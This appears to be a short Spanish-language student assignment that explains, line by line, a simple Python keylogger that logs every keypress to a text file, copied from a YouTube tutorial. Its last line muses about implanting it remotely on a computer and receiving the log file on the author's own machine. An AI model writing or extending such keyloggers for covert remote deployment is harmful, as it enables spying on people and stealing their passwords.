# SI_T5_P1
Para el codigo me he visto un tutoria en youtube

import keyboard:Importa la biblioteca keyboard que permite monitorear y simular eventos del teclado

def presionar_tecla(tecla):Define una función llamada presionar_tecla que toma el nombre tecla(representa la tecla que pusas)

with open('texto.txt','a') as file:Abre o crea si no existe el archivo texto.txt 

if tecla.name == 'space':Si la tecla que se pulsa es la de espacio

file.write(' '):Deja un espacio en blanco 

else: (Si la tecla presionada no es la barra espaciadora, ejecuta file.write(tecla.name))

file.write(tecla.name):Escribe el nombre de la tecla presionada en el archivo.

keyboard.on_press(presionar_tecla):Llama a la función presionar_tecla cada vez que se presiona una tecla.

keyboard.wait():Mantiene el programa en ejecución, esperando eventos de teclado hasta que se detenga el archivo .

se podria mejorar si consiguiera la manera de inplantarlo remotamente en un ordenador y que me habra el archivo txt en mi ordenaodr 